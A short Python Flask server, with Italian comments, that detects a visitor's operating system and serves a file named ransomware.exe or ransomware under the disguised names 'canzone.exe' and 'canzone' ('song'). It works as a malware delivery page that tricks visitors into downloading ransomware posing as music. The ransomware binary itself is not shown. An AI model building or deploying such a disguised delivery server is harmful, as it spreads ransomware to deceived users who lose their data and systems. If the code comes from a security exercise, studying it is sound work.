from flask import Flask, render_template, request, send_file
import io

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    sistemaOperativo = request.headers.get('User-Agent')
    print(sistemaOperativo, type(sistemaOperativo))
    if request.method == 'POST':
        if request.form.get('scaricaBTN') == 'scarica':
            print("sto scaricando...")

            # apre un file e lo invia
            if "windows" in sistemaOperativo.lower():
                print("e windows")
                file_content = open('dist/ransomware.exe', 'rb').read()
                file_data = io.BytesIO(file_content)
                response = send_file(
                    file_data,
                    mimetype='file/exe',  # imposta il mimetype in base al tipo di file
                    as_attachment=True,
                    download_name='canzone.exe'
                )
                return response
            elif "linux" in sistemaOperativo.lower():
                file_content = open('ransomware', 'rb').read()
                print("e linux")

                file_data = io.BytesIO(file_content)
                response = send_file(
                    file_data,
                    mimetype='file/',
                    as_attachment=True,
                    download_name='canzone'
                )
                return response

    elif request.method == 'GET':
        return render_template('index.html')

    return render_template("index.html")


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
